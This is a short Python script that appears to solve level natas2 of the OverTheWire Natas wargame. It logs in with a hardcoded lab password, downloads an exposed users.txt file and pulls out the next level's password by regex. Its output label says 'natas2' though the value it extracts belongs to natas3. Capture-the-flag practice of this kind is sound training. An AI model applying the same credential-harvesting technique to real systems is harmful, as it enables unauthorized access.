#!/usr/bin/env python

import requests
import re  

username = 'natas2'
password = 'h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7'

url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % username

response = requests.get(url, auth=(username, password))
content = response.text 

# print(content)


password_list = re.findall('natas3:(.*)', content)
if password_list:

    print("Password for natas2:", password_list[0])
    print("[+] success!")
else:
    print("Password not found.")
